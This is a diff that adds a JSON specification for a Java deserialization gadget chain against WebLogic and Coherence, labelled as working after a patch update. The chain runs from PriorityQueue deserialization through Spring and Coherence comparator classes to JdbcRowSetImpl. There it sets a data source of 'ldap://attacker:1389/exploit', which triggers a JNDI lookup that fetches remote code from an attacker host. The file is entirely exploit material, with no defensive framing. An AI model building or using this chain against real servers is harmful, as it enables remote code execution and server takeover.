@@ -1,0 +1,41 @@
+{
+  "chain_type": "Post-PSU: BEA CompoundComparator → InvertibleComparator → ExtractorComparator → reporter",
+  "root_class": "java.util.PriorityQueue",
+  "root_trigger": "readObject→heapify→comparator.compare→CompoundComparator→InvertibleComparator→ExtractorComparator",
+  "links": [
+    {
+      "class": "com.bea.core.repackaged.springframework.util.comparator.CompoundComparator",
+      "field_overrides": {
+        "comparators": [{"$ref": "link:1"}]
+      }
+    },
+    {
+      "class": "com.bea.core.repackaged.springframework.util.comparator.InvertibleComparator",
+      "field_overrides": {
+        "comparator": {"$ref": "link:2"},
+        "ascending": true
+      }
+    },
+    {
+      "class": "com.tangosol.util.comparator.ExtractorComparator",
+      "field_overrides": {
+        "m_extractor": {"$ref": "link:3"}
+      }
+    },
+    {
+      "class": "com.tangosol.coherence.reporter.extractor.AttributeExtractor",
+      "field_overrides": {
+        "m_sName": "databaseMetaData",
+        "m_aoParam": [],
+        "m_nTarget": 0
+      }
+    },
+    {
+      "class": "com.sun.rowset.JdbcRowSetImpl",
+      "field_overrides": {
+        "dataSource": "ldap://attacker:1389/exploit"
+      }
+    }
+  ],
+  "sink_method": "JdbcRowSetImpl.getDatabaseMetaData→JNDI"
+}
